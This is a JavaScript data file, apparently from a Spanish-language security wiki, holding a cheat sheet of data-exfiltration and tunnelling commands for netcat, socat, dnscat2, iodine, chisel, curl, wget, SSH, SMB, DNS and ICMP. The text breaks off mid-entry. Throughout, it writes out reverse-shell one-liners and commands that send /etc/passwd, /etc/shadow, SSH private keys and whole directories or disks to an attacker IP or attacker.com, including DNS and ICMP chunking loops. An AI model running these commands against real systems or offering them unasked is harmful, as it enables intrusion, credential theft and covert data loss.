// Exfiltracion (Exfiltration)
window.WIKI_CHEATSHEETS_12_EXFILTRATION = [
 {
  "tool": "netcat",
  "desc": "El cuchillo suizo de red (nc) - transferencia de datos",
  "commands": [
   {
    "cmd": "nc -lvnp 4444",
    "desc": "Listener"
   },
   {
    "cmd": "nc -lvnp 4444 > recibido.txt",
    "desc": "Recibir archivo"
   },
   {
    "cmd": "nc -w 3 IP 4444 < archivo.txt",
    "desc": "Enviar archivo"
   },
   {
    "cmd": "nc -lvnp 4444 -e /bin/sh",
    "desc": "Shell con -e (legacy)"
   },
   {
    "cmd": "nc -lvnp 4444 -e cmd.exe",
    "desc": "Shell Windows"
   },
   {
    "cmd": "nc -lvnp 4444 -c /bin/bash",
    "desc": "Bash con -c"
   },
   {
    "cmd": "nc IP 4444 -e /bin/bash",
    "desc": "Reverse shell"
   },
   {
    "cmd": "nc -u -lvnp 5555",
    "desc": "UDP listener"
   },
   {
    "cmd": "nc -z -v IP 1-1000",
    "desc": "Escaneo de puertos"
   },
   {
    "cmd": "nc -vz IP 80",
    "desc": "Verificar puerto"
   },
   {
    "cmd": "nc -zv IP 20-30",
    "desc": "Rango"
   },
   {
    "cmd": "nc -lp 4444 < passwd.txt",
    "desc": "Servir archivo"
   },
   {
    "cmd": "cat /etc/passwd | nc IP 4444",
    "desc": "Exfiltrar por pipe"
   },
   {
    "cmd": "tar czf - /var/www | nc IP 4444",
    "desc": "Exfiltrar directorio comprimido"
   },
   {
    "cmd": "nc IP 4444 | tar xzf -",
    "desc": "Recibir y descomprimir"
   },
   {
    "cmd": "nc -lvnp 4444 -k",
    "desc": "Seguir escuchando"
   },
   {
    "cmd": "nc -n IP 4444",
    "desc": "Sin resolución"
   },
   {
    "cmd": "nc -s 192.168.1.100 IP 4444",
    "desc": "IP origen"
   },
   {
    "cmd": "nc -p 53 IP 4444",
    "desc": "Puerto origen 53"
   },
   {
    "cmd": "nc -6 IP 4444",
    "desc": "IPv6"
   },
   {
    "cmd": "nc -t IP 4444",
    "desc": "Telnet mode"
   },
   {
    "cmd": "nc -d IP 4444",
    "desc": "Detach (background)"
   },
   {
    "cmd": "nc -q 5 IP 4444",
    "desc": "Quit tras 5s EOF"
   },
   {
    "cmd": "nc -i 1 IP 4444 < file",
    "desc": "Intervalo 1s entre líneas"
   }
  ]
 },
 {
  "tool": "ncat",
  "desc": "Netcat mejorado de Nmap (SSL, socks, proxy)",
  "commands": [
   {
    "cmd": "ncat -lvnp 4444",
    "desc": "Listener"
   },
   {
    "cmd": "ncat -lvnp 4444 --ssl",
    "desc": "Listener SSL"
   },
   {
    "cmd": "ncat --ssl IP 4444",
    "desc": "Conectar SSL"
   },
   {
    "cmd": "ncat -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem",
    "desc": "Con certificados"
   },
   {
    "cmd": "ncat -lvnp 4444 -e /bin/bash",
    "desc": "Shell"
   },
   {
    "cmd": "ncat IP 4444 -e /bin/sh",
    "desc": "Reverse"
   },
   {
    "cmd": "ncat -u -lvnp 5555",
    "desc": "UDP"
   },
   {
    "cmd": "ncat -z IP 1-1000",
    "desc": "Port scan"
   },
   {
    "cmd": "ncat --proxy 127.0.0.1:8080 IP 80",
    "desc": "Vía proxy"
   },
   {
    "cmd": "ncat --proxy-type socks5 --proxy 127.0.0.1:1080 IP 80",
    "desc": "SOCKS5"
   },
   {
    "cmd": "ncat -4 IP 4444",
    "desc": "Solo IPv4"
   },
   {
    "cmd": "ncat -6 IP 4444",
    "desc": "Solo IPv6"
   },
   {
    "cmd": "ncat -v IP 4444",
    "desc": "Verbose"
   },
   {
    "cmd": "ncat -w 10 IP 4444",
    "desc": "Timeout"
   },
   {
    "cmd": "ncat -k -lvnp 4444",
    "desc": "Keep listening"
   },
   {
    "cmd": "ncat --broker -lvnp 4444",
    "desc": "Modo broker"
   },
   {
    "cmd": "ncat --chat IP 4444",
    "desc": "Chat"
   },
   {
    "cmd": "ncat -l -p 4444 --send-only < file.txt",
    "desc": "Enviar archivo"
   },
   {
    "cmd": "ncat -l -p 4444 --recv-only > out.txt",
    "desc": "Recibir"
   },
   {
    "cmd": "ncat --exec /bin/bash -lvnp 4444",
    "desc": "Ejecutar programa"
   }
  ]
 },
 {
  "tool": "socat",
  "desc": "Multipurpose relay/socket (mucho más que netcat)",
  "commands": [
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT",
    "desc": "Listener"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
    "desc": "Shell"
   },
   {
    "cmd": "socat TCP:IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
    "desc": "Reverse shell con TTY"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork FILE:out.txt",
    "desc": "Recibir archivo"
   },
   {
    "cmd": "socat TCP:IP:4444 FILE:file.txt",
    "desc": "Enviar archivo"
   },
   {
    "cmd": "socat UDP-LISTEN:5555,reuseaddr STDOUT",
    "desc": "UDP listener"
   },
   {
    "cmd": "socat -d -d TCP-LISTEN:4444,reuseaddr,fork STDOUT",
    "desc": "Debug"
   },
   {
    "cmd": "socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080",
    "desc": "Port forward"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork TCP:192.168.1.10:445",
    "desc": "Proxy SMB"
   },
   {
    "cmd": "socat TCP-LISTEN:53,reuseaddr,fork TCP:8.8.8.8:53",
    "desc": "Reenviar DNS"
   },
   {
    "cmd": "socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:80",
    "desc": "Unix socket"
   },
   {
    "cmd": "socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=cert.pem,verify=0 STDOUT",
    "desc": "TLS listener"
   },
   {
    "cmd": "socat OPENSSL:IP:443,verify=0 TCP:127.0.0.1:80",
    "desc": "Cliente TLS"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork SYSTEM:'/bin/sh'",
    "desc": "Shell con SYSTEM"
   },
   {
    "cmd": "socat -T 30 TCP-LISTEN:4444,reuseaddr,fork STDOUT",
    "desc": "Timeout"
   },
   {
    "cmd": "socat STDIO TCP4:IP:22,connect-timeout=5",
    "desc": "Con timeout"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT &",
    "desc": "En background"
   },
   {
    "cmd": "socat UDP4-LISTEN:161,reuseaddr,fork TCP4:127.0.0.1:161",
    "desc": "UDP-TCP relay"
   },
   {
    "cmd": "socat PTY,link=/dev/ttyS0,waitslave TCP:IP:4444",
    "desc": "Pseudo-TTY remoto"
   },
   {
    "cmd": "socat TCP:IP:4444 EXEC:'/bin/bash -i',pty,stderr,sane",
    "desc": "TTY interactivo"
   }
  ]
 },
 {
  "tool": "dnscat2",
  "desc": "Exfiltración y C2 a través de DNS",
  "commands": [
   {
    "cmd": "dnscat2-server objetivo.com",
    "desc": "Servidor (modo dominio)"
   },
   {
    "cmd": "dnscat2-server -e open objetivo.com",
    "desc": "Servidor en modo open"
   },
   {
    "cmd": "dnscat2-server --secret=s3cret objetivo.com",
    "desc": "Con secreto"
   },
   {
    "cmd": "dnscat2-server -v objetivo.com",
    "desc": "Verbose"
   },
   {
    "cmd": "dnscat2-server --dns port=53 objetivo.com",
    "desc": "Puerto DNS"
   },
   {
    "cmd": "dnscat2-server --no-cache objetivo.com",
    "desc": "Sin cache"
   },
   {
    "cmd": "dnscat2-server --dnscat2-port 53 --dns port=53 objetivo.com",
    "desc": "Puertos"
   },
   {
    "cmd": "./dnscat2.exe --dns server=IP,port=53 --secret=s3cret",
    "desc": "Cliente Windows"
   },
   {
    "cmd": "dnscat2-client --dns server=IP,port=53 objetivo.com",
    "desc": "Cliente"
   },
   {
    "cmd": "dnscat2-server objetivo.com > shell",
    "desc": "Interactuar"
   },
   {
    "cmd": "dnscat2> session -i 1",
    "desc": "Seleccionar sesión"
   },
   {
    "cmd": "dnscat2> shell",
    "desc": "Abrir shell"
   },
   {
    "cmd": "dnscat2> exec whoami",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "dnscat2> download C:\\file",
    "desc": "Descargar"
   },
   {
    "cmd": "dnscat2> upload file",
    "desc": "Subir"
   },
   {
    "cmd": "dnscat2> listen 8080 127.0.0.1:80",
    "desc": "Port forward"
   },
   {
    "cmd": "dnscat2> ping",
    "desc": "Ping al agente"
   },
   {
    "cmd": "dnscat2> kill session",
    "desc": "Matar sesión"
   }
  ]
 },
 {
  "tool": "iodine",
  "desc": "Túnel IPv4 sobre DNS (exfiltración total)",
  "commands": [
   {
    "cmd": "iodined -f -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Servidor en foreground"
   },
   {
    "cmd": "iodined -P pass -n 8.8.8.8 10.0.0.1 tun.objetivo.com",
    "desc": "Con upstream DNS"
   },
   {
    "cmd": "iodined -c -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Sin compresión"
   },
   {
    "cmd": "iodine -f -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Cliente"
   },
   {
    "cmd": "iodine -r -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Raw mode"
   },
   {
    "cmd": "iodine -T1 -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Transport 1"
   },
   {
    "cmd": "iodine -d eth0 -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Interfaz"
   },
   {
    "cmd": "iodine -v 3 -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Verbose"
   },
   {
    "cmd": "iodined -D -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Daemon"
   },
   {
    "cmd": "iodine -t 20 -P pass 10.0.0.1 tun.objetivo.com",
    "desc": "Timeout"
   }
  ]
 },
 {
  "tool": "exfiltrator",
  "desc": "Exfiltración de archivos vía DNS, HTTP, ICMP (Windows)",
  "commands": [
   {
    "cmd": "Exfiltrator.exe -p http -i file.txt -s IP -d 80",
    "desc": "Vía HTTP"
   },
   {
    "cmd": "Exfiltrator.exe -p dns -i file.txt -s IP -d 53",
    "desc": "Vía DNS"
   },
   {
    "cmd": "Exfiltrator.exe -p icmp -i file.txt -s IP",
    "desc": "Vía ICMP"
   },
   {
    "cmd": "Exfiltrator.exe -p smtp -i file.txt -s mail.com -d 25",
    "desc": "Vía SMTP"
   },
   {
    "cmd": "Exfiltrator.exe -p http -i file.txt -s IP -d 80 -c 10",
    "desc": "Con compression"
   },
   {
    "cmd": "Exfiltrator.exe -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "cryptcat-exfil",
  "desc": "Exfiltrar datos cifrados con Twofish",
  "commands": [
   {
    "cmd": "cryptcat -l -p 4444 -k clave > data.bin",
    "desc": "Recibir cifrado"
   },
   {
    "cmd": "cryptcat -l -p 4444 -k clave < file -w 10",
    "desc": "Recibir con timeout"
   },
   {
    "cmd": "cryptcat IP 4444 -k clave < secret.tar",
    "desc": "Enviar"
   },
   {
    "cmd": "cryptcat -u -l -p 4444 -k clave",
    "desc": "UDP"
   },
   {
    "cmd": "cryptcat -v IP 4444 -k clave",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "http-tunnel",
  "desc": "Túnel de conexiones TCP vía HTTP (CONNECT)",
  "commands": [
   {
    "cmd": "hts -F localhost:22 -S 8080",
    "desc": "Servidor (forward)"
   },
   {
    "cmd": "htc -F 8888 -P IP:8080 objetivo.com",
    "desc": "Cliente"
   },
   {
    "cmd": "hts -F 22 -S 80 -A 'Basic auth'",
    "desc": "Con auth"
   },
   {
    "cmd": "htc -F 1080 -P IP:8080 -T localhost:22",
    "desc": "TCP forward"
   },
   {
    "cmd": "htc -F 1080 -P IP:8080 -R",
    "desc": "Reverse mode"
   }
  ]
 },
 {
  "tool": "tcp-over-dns",
  "desc": "Exfiltración TCP sobre DNS",
  "commands": [
   {
    "cmd": "tcp-over-dns -s -d tun.objetivo.com -p 53",
    "desc": "Servidor"
   },
   {
    "cmd": "tcp-over-dns -c -s IP -p 53",
    "desc": "Cliente"
   },
   {
    "cmd": "tcp-over-dns -s -d dominio -p 53 -k key",
    "desc": "Con clave"
   },
   {
    "cmd": "tcp-over-dns -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "curl-exfil",
  "desc": "Exfiltración de datos con curl",
  "commands": [
   {
    "cmd": "curl -X POST -d @/etc/passwd http://IP/upload",
    "desc": "POST de archivo"
   },
   {
    "cmd": "curl -T /etc/passwd http://IP/",
    "desc": "PUT file"
   },
   {
    "cmd": "curl -F 'file=@/etc/passwd' http://IP/upload",
    "desc": "Multipart"
   },
   {
    "cmd": "curl -X POST -d '$(cat /etc/hostname)' http://IP/",
    "desc": "Exfil variable"
   },
   {
    "cmd": "curl -X POST -H 'Content-Type: text/plain' --data-binary @file http://IP/",
    "desc": "Binary"
   },
   {
    "cmd": "curl -o /dev/null -w '%{http_code}' http://IP",
    "desc": "Status"
   },
   {
    "cmd": "curl -s -X POST -d '$(ifconfig)' http://IP/c",
    "desc": "Interfaces"
   },
   {
    "cmd": "curl --data-urlencode 'data@/etc/passwd' http://IP/",
    "desc": "URL encode"
   },
   {
    "cmd": "curl -k -X POST -d @file https://IP/upload",
    "desc": "HTTPS sin verify"
   },
   {
    "cmd": "curl -s -X POST -d '$(cat ~/.ssh/id_rsa)' http://IP/",
    "desc": "SSH key"
   },
   {
    "cmd": "curl -H 'X-Exfil: $(hostname)' http://IP/",
    "desc": "Exfil en header"
   },
   {
    "cmd": "curl -v -X POST -d @file http://IP/ 2>&1",
    "desc": "Verbose"
   },
   {
    "cmd": "curl --path-as-is -X POST -d @file http://IP/",
    "desc": "Path as is"
   },
   {
    "cmd": "curl -x socks5://127.0.0.1:1080 -d @file http://IP/",
    "desc": "Vía SOCKS"
   },
   {
    "cmd": "curl -b 'SESSION=abc' -d @file http://IP/",
    "desc": "Con cookies"
   }
  ]
 },
 {
  "tool": "wget-exfil",
  "desc": "Exfiltración de datos con wget",
  "commands": [
   {
    "cmd": "wget --post-file=/etc/passwd http://IP/upload",
    "desc": "POST file"
   },
   {
    "cmd": "wget --post-data='$(cat /etc/hostname)' http://IP/",
    "desc": "POST data"
   },
   {
    "cmd": "wget --method=PUT --body-file=/etc/passwd http://IP/",
    "desc": "PUT"
   },
   {
    "cmd": "wget -O /dev/null http://IP",
    "desc": "Descartar"
   },
   {
    "cmd": "wget --no-check-certificate --post-file=f https://IP/",
    "desc": "HTTPS"
   },
   {
    "cmd": "wget -q --post-file=/etc/shadow http://IP/",
    "desc": "Quiet"
   },
   {
    "cmd": "wget -T 5 --post-file=f http://IP/",
    "desc": "Timeout"
   },
   {
    "cmd": "wget --header='X-A: b' --post-file=f http://IP/",
    "desc": "Headers"
   },
   {
    "cmd": "wget --user=u --password=p --post-file=f http://IP/",
    "desc": "Auth"
   },
   {
    "cmd": "wget --post-file=f --proxy=on -e use_proxy=yes -e http_proxy=IP:8080 http://dest/",
    "desc": "Vía proxy"
   },
   {
    "cmd": "wget -S --post-file=f http://IP/",
    "desc": "Server response"
   },
   {
    "cmd": "wget --tries=1 --post-file=f http://IP/",
    "desc": "1 intento"
   }
  ]
 },
 {
  "tool": "base64-exfil",
  "desc": "Técnicas de exfiltración con base64",
  "commands": [
   {
    "cmd": "base64 -w0 /etc/passwd | nc IP 4444",
    "desc": "Base64 + nc"
   },
   {
    "cmd": "base64 -w0 /etc/passwd | curl -d @- http://IP/",
    "desc": "Base64 + curl"
   },
   {
    "cmd": "base64 -w0 -i file | nslookup exfil.dnslog",
    "desc": "Base64 vía DNS"
   },
   {
    "cmd": "base64 -w0 file | openssl enc -aes-256-cbc -k pass | nc IP 4444",
    "desc": "Cifrado+nc"
   },
   {
    "cmd": "tar czf - /etc | base64 -w0 | nc IP 4444",
    "desc": "Tar+base64"
   },
   {
    "cmd": "cat file | base64 | xargs -I{} ping -c1 {}.dnslog",
    "desc": "Ping exfil"
   },
   {
    "cmd": "for b in $(base64 -w0 file); do host $b.dnslog; done",
    "desc": "DNS chunks"
   },
   {
    "cmd": "base64 -w0 file | split -b 200 - /tmp/chunk_",
    "desc": "Dividir"
   },
   {
    "cmd": "base64 file | while read l; do host $l.dnslog; done",
    "desc": "Por líneas"
   },
   {
    "cmd": "echo $(base64 file) | curl -d @- http://IP/",
    "desc": "Echo+curl"
   }
  ]
 },
 {
  "tool": "gzip-enc-exfil",
  "desc": "Exfiltración comprimida y cifrada con OpenSSL",
  "commands": [
   {
    "cmd": "tar czf - /etc/passwd | openssl enc -aes-256-cbc -k pass | nc IP 4444",
    "desc": "Tar+enc+nc"
   },
   {
    "cmd": "tar czf - /var/www | openssl enc -base64 -A -aes-256-cbc -k pass | nc IP 4444",
    "desc": "Con base64"
   },
   {
    "cmd": "openssl enc -aes-256-cbc -k pass -in /etc/passwd -out /tmp/x.enc | nc IP 4444",
    "desc": "Enc directo"
   },
   {
    "cmd": "gzip -c /etc/passwd | openssl enc -aes-256-cbc -k pass | nc IP 4444",
    "desc": "Gzip+enc"
   },
   {
    "cmd": "tar czf - /etc | openssl enc -aes-256-cbc -k pass -pbkdf2 | nc IP 4444",
    "desc": "Con pbkdf2"
   },
   {
    "cmd": "nc IP 4444 | openssl enc -d -aes-256-cbc -k pass | tar xzf -",
    "desc": "Receptor"
   },
   {
    "cmd": "openssl enc -aes-256-cbc -k pass -in f | base64 | curl -d @- http://IP/",
    "desc": "Enc+curl"
   },
   {
    "cmd": "tar czf - /etc | openssl dgst -sha256",
    "desc": "Hash exfil"
   }
  ]
 },
 {
  "tool": "chisel-exfil",
  "desc": "Túneles de exfiltración con chisel (client/socks)",
  "commands": [
   {
    "cmd": "chisel server -p 8080 --reverse",
    "desc": "Servidor reverse"
   },
   {
    "cmd": "chisel server -p 8080",
    "desc": "Servidor normal"
   },
   {
    "cmd": "chisel server -p 8080 --socks5",
    "desc": "SOCKS5"
   },
   {
    "cmd": "chisel client IP:8080 R:4444:localhost:4444",
    "desc": "Reverse port"
   },
   {
    "cmd": "chisel client IP:8080 L:8080:localhost:80",
    "desc": "Local port"
   },
   {
    "cmd": "chisel client IP:8080 R:socks",
    "desc": "SOCKS reverse"
   },
   {
    "cmd": "chisel client IP:8080 L:9000:10.0.0.5:3306",
    "desc": "MySQL forward"
   },
   {
    "cmd": "chisel client --fingerprint FINGER IP:8080 R:4444:localhost:4444",
    "desc": "Con fingerprint"
   },
   {
    "cmd": "chisel client IP:8080 R:53:localhost:53/udp",
    "desc": "UDP"
   },
   {
    "cmd": "chisel server -p 8080 --auth user:pass",
    "desc": "Con auth"
   },
   {
    "cmd": "chisel client user:pass@IP:8080 R:4444:localhost:4444",
    "desc": "Auth cliente"
   },
   {
    "cmd": "chisel server -p 8080 --tls-cert c.pem --tls-key k.pem",
    "desc": "TLS"
   },
   {
    "cmd": "chisel server -v",
    "desc": "Verbose"
   },
   {
    "cmd": "chisel server -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ftp-exfil",
  "desc": "Exfiltración de archivos vía FTP",
  "commands": [
   {
    "cmd": "ftp IP <<< 'put /etc/passwd'",
    "desc": "Subir por ftp"
   },
   {
    "cmd": "echo -e 'user\\npass\\nput file\\nquit' | ftp IP",
    "desc": "Script ftp"
   },
   {
    "cmd": "curl -T file ftp://IP --user user:pass",
    "desc": "curl ftp upload"
   },
   {
    "cmd": "wget --ftp-user=u --ftp-password=p ftp://IP",
    "desc": "wget ftp"
   },
   {
    "cmd": "lftp -u user,pass IP -e 'put file; quit'",
    "desc": "lftp"
   },
   {
    "cmd": "ftp -n IP <<< 'user u p'",
    "desc": "Sin login interactivo"
   },
   {
    "cmd": "ncftpput -u user -p pass IP /ruta file",
    "desc": "ncftpput"
   },
   {
    "cmd": "ftp IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "printf 'put /etc/shadow\\n' | ftp -n IP",
    "desc": "Pipe"
   },
   {
    "cmd": "openssl s_client -connect IP:21 -starttls ftp",
    "desc": "FTPS"
   }
  ]
 },
 {
  "tool": "sftp-exfil",
  "desc": "Exfiltración vía SFTP",
  "commands": [
   {
    "cmd": "sftp user@IP <<< 'put file'",
    "desc": "Subir"
   },
   {
    "cmd": "sftp -b batch.txt user@IP",
    "desc": "Batch"
   },
   {
    "cmd": "sftp user@IP <<< 'put -r dir'",
    "desc": "Recursivo"
   },
   {
    "cmd": "sshpass -p pass sftp user@IP <<< 'put file'",
    "desc": "Con password"
   },
   {
    "cmd": "sftp -P 2222 user@IP",
    "desc": "Puerto"
   },
   {
    "cmd": "sftp -i key user@IP",
    "desc": "Con clave"
   },
   {
    "cmd": "sftp user@IP <<< 'ls'",
    "desc": "Listar"
   },
   {
    "cmd": "sftp user@IP <<< 'get file'",
    "desc": "Descargar"
   },
   {
    "cmd": "sftp user@IP <<< 'rm file'",
    "desc": "Borrar"
   },
   {
    "cmd": "sftp user@IP <<< 'put /etc/passwd secret.txt'",
    "desc": "Renombrar"
   },
   {
    "cmd": "sftp -q user@IP",
    "desc": "Quiet"
   }
  ]
 },
 {
  "tool": "python-http-exfil",
  "desc": "Exfiltración con servidores HTTP de Python",
  "commands": [
   {
    "cmd": "python3 -m http.server 80",
    "desc": "Servir cwd"
   },
   {
    "cmd": "python3 -m http.server 8080 --bind 0.0.0.0",
    "desc": "Bind"
   },
   {
    "cmd": "python3 -m http.server 80 --directory /tmp/exfil",
    "desc": "Directorio"
   },
   {
    "cmd": "python3 -m http.server 80 &",
    "desc": "Background"
   },
   {
    "cmd": "python3 -c 'from http.server import *; HTTPServer((\"0.0.0.0\",80),SimpleHTTPRequestHandler).serve_forever()'",
    "desc": "One-liner"
   },
   {
    "cmd": "python3 -m uploadserver 80",
    "desc": "Servidor con POST"
   },
   {
    "cmd": "curl -F 'files=@file' http://IP:80/upload",
    "desc": "Subir al uploadserver"
   },
   {
    "cmd": "python2 -m SimpleHTTPServer 80",
    "desc": "Python2"
   },
   {
    "cmd": "wget -r http://IP:80/",
    "desc": "Descargar todo"
   },
   {
    "cmd": "nc IP 80 < /dev/null; curl -o out http://IP:80/file",
    "desc": "Fetch"
   },
   {
    "cmd": "curl http://IP:80/file -o local.bin",
    "desc": "Descarga directa"
   }
  ]
 },
 {
  "tool": "ssh-exfil",
  "desc": "Exfiltración de datos vía SSH",
  "commands": [
   {
    "cmd": "tar czf - /etc | ssh user@IP 'cat > /tmp/x.tar.gz'",
    "desc": "Tar+ssh"
   },
   {
    "cmd": "cat file | ssh user@IP 'cat > /tmp/file'",
    "desc": "Stream simple"
   },
   {
    "cmd": "scp file user@IP:/tmp/",
    "desc": "scp"
   },
   {
    "cmd": "rsync -av /etc/ user@IP:/tmp/etc/",
    "desc": "rsync"
   },
   {
    "cmd": "ssh user@IP 'cat /tmp/file' > local.txt",
    "desc": "Descargar"
   },
   {
    "cmd": "dd if=/dev/sda | ssh user@IP 'dd of=/tmp/disk.img'",
    "desc": "Disco completo"
   },
   {
    "cmd": "ssh user@IP 'mkdir -p /tmp/d' && tar czf - /var | ssh user@IP 'tar xzf - -C /tmp/d'",
    "desc": "Dir recursivo"
   },
   {
    "cmd": "openssl enc -aes-256-cbc -k pass -in file | ssh user@IP 'cat > f.enc'",
    "desc": "Cifrado+ssh"
   },
   {
    "cmd": "ssh -o StrictHostKeyChecking=no user@IP 'cat > /tmp/x' < file",
    "desc": "Sin check"
   },
   {
    "cmd": "ssh -p 2222 user@IP 'cat > /tmp/x' < file",
    "desc": "Puerto"
   },
   {
    "cmd": "ssh user@IP 'base64 -d > /tmp/f' < <(base64 file)",
    "desc": "Base64+ssh"
   }
  ]
 },
 {
  "tool": "dns-exfil-custom",
  "desc": "Exfiltración vía DNS (dig/nslookup/host)",
  "commands": [
   {
    "cmd": "dig +short TXT exfil.dnslog.com",
    "desc": "Resolver TXT"
   },
   {
    "cmd": "host -t TXT $(base64 -w0 file | cut -c1-50).dnslog.com",
    "desc": "Host TXT"
   },
   {
    "cmd": "nslookup $(hostname).attacker.com",
    "desc": "Hostname vía DNS"
   },
   {
    "cmd": "for chunk in $(base64 -w0 file | fold -w40); do dig +short $chunk.attacker.com; done",
    "desc": "Chunks"
   },
   {
    "cmd": "dig @8.8.8.8 $(whoami).exfil.com",
    "desc": "Resolución externa"
   },
   {
    "cmd": "while read l; do nslookup $l.exfil.com; done < /tmp/data",
    "desc": "Por línea"
   },
   {
    "cmd": "xxd -p file | tr -d '\\n' | fold -w30 | while read c; do dig $c.exfil.com; done",
    "desc": "Hex chunks"
   },
   {
    "cmd": "dig +short A $(date +%s).exfil.com",
    "desc": "Timestamp"
   },
   {
    "cmd": "host $(cat /etc/hostname | tr -d '\\n').exfil.com",
    "desc": "Hostname"
   },
   {
    "cmd": "ping -c1 $(base64 -w0 file | cut -c1-30).exfil.com",
    "desc": "Ping DNS"
   }
  ]
 },
 {
  "tool": "smb-exfil",
  "desc": "Exfiltración vía SMB",
  "commands": [
   {
    "cmd": "smbclient -L //IP -U user%pass",
    "desc": "Listar"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'put /tmp/secret.txt'",
    "desc": "Subir"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'get secret.txt'",
    "desc": "Bajar"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'ls'",
    "desc": "Listar share"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'cd dir; put x'",
    "desc": "Subir a dir"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'mkdir exfil'",
    "desc": "Crear dir"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'prompt; recurse; mput /tmp/*'",
    "desc": "Subir todo"
   },
   {
    "cmd": "mount -t cifs //IP/share /mnt -o username=user,password=pass",
    "desc": "Montar"
   },
   {
    "cmd": "cp /tmp/secret /mnt/",
    "desc": "Copiar"
   },
   {
    "cmd": "smbget smb://user:pass@IP/share/file",
    "desc": "Smbget"
   },
   {
    "cmd": "smbmap -H IP -u user -p pass -R",
    "desc": "Recursive"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --share exfil --put-file /tmp/x --get-file x",
    "desc": "CME transfer"
   },
   {
    "cmd": "impacket-smbclient IP -user user -password pass",
    "desc": "Impacket"
   },
   {
    "cmd": "smbclient //IP/CS -U user%pass -c 'put C:\\\\secret.txt'",
    "desc": "Admin share"
   }
  ]
 },
 {
  "tool": "dns-exfil",
  "desc": "Exfiltración sobre DNS",
  "commands": [
   {
    "cmd": "dig +short TXT exfil.attacker.com",
    "desc": "Recuperar TXT"
   },
   {
    "cmd": "echo 'secret' | base64",
    "desc": "Codificar"
   },
   {
    "cmd": "dig +short secret.base64.attacker.com",
    "desc": "Enviar por subdominio"
   },
   {
    "cmd": "python3 -c 'import socket; socket.gethostbyname(\"data.attacker.com\")'",
    "desc": "Python DNS"
   },
   {
    "cmd": "nslookup -type=TXT data.attacker.com",
    "desc": "Nslookup"
   },
   {
    "cmd": "host -t TXT data.attacker.com",
    "desc": "Host"
   },
   {
    "cmd": "for c in $(base64 -w0 /etc/shadow | fold -w 40); do dig +short $c.attacker.com; done",
    "desc": "Loop exfil"
   },
   {
    "cmd": "dns2tcp -r -z -d attacker.com -c dns2tcpd.conf",
    "desc": "Dns2tcp server"
   },
   {
    "cmd": "dns2tcpc -c shell -z attacker.com -r attacker.com",
    "desc": "Dns2tcp client"
   },
   {
    "cmd": "iodine -f 10.0.0.1 attacker.com",
    "desc": "Iodine"
   },
   {
    "cmd": "iodined -f -c -P pass 10.0.0.1 attacker.com",
    "desc": "Iodined"
   },
   {
    "cmd": "echo 'data' | nc -u -w1 IP 53",
    "desc": "UDP raw"
   },
   {
    "cmd": "dnscat2> exec 'cat /etc/shadow'",
    "desc": "Dnscat2 exec"
   },
   {
    "cmd": "tcpdump -i eth0 'udp port 53' -w dns.pcap",
    "desc": "Capturar DNS"
   }
  ]
 },
 {
  "tool": "icmp-exfil",
  "desc": "Exfiltración sobre ICMP",
  "commands": [
   {
    "cmd": "ping -p '736563726574' IP",
    "desc": "Enviar hex"
   },
   {
    "cmd": "ping -p '41424344' -c 1 IP",
    "desc": "Ping data"
   },
   {
    "cmd": "xxd -p /tmp/secret | tr -d '\\n' | fold -w 16",
    "desc": "Hex en chunks"
   },
   {
    "cmd": "for h in $(xxd -p /tmp/secret | tr -d '\\n' | fold -w 16); do ping -p $h -c 1 IP; done",
    "desc": "Loop ICMP"
   },
   {
    "cmd": "tcpdump -i eth0 'icmp' -w icmp.pcap",
    "desc": "Capturar"
   },
   {
    "cmd": "tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data",
    "desc": "Extraer data"
   },
   {
    "cmd": "ptunnel -p IP -lp 8080 -da target -dp 22",
    "desc": "Ptunnel server"
   },
   {
    "cmd": "ptunnel -p IP -lp 8080 -da target -dp 22 -c client",
    "desc": "Cliente"
   },
   {
    "cmd": "python3 -c 'import os; os.system(\"ping -c 1 -p 736563726574 IP\")'",
    "desc": "Python ping"
   },
   {
    "cmd": "nping --icmp --data-string 'secret' IP",
    "desc": "Nping"
   }
  ]
 },
 {
  "tool": "http-exfil",
  "desc": "Exfiltración vía HTTP",
  "commands": [
   {
    "cmd": "curl -X POST -d 'data=SECRET' http://attacker.com/collect",
    "desc": "POST data"
   },
   {
    "cmd": "curl -X POST -F 'file=@/tmp/secret' http://attacker.com/upload",
    "desc": "POST file"
   },
   {
    "cmd": "curl -X PUT -T /tmp/secret http://attacker.com/upload/secret",
    "desc": "PUT"
   },
   {
    "cmd": "curl -s 'http://attacker.com/collect?data=$(cat /tmp/secret | base64)'",
    "desc": "GET query"
   },
   {
    "cmd": "nc -lvnp 80",
    "desc": "Listener netcat"
   },
   {
